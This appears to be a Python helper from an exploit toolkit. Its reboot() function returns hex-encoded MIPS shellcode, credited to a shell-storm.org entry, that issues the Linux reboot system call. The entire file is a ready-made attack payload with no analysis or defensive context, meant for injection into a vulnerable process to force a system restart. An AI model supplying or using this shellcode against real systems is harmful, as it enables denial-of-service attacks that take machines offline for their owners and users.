#http://shell-storm.org/shellcode/files/shellcode-795.php
#Author: rigan - imrigan [sobachka] gmail.com

def reboot():
	shellcode =  r"\x3c\x06\x43\x21"     	
	shellcode += r"\x34\xc6\xfe\xdc"      	
	shellcode += r"\x3c\x05\x28\x12"      	
	shellcode += r"\x34\xa5\x19\x69"  	
	shellcode += r"\x3c\x04\xfe\xe1"      	
	shellcode += r"\x34\x84\xde\xad"    	
	shellcode += r"\x24\x02\x0f\xf8"      	
	shellcode += r"\x01\x01\x01\x0c"
	return shellcode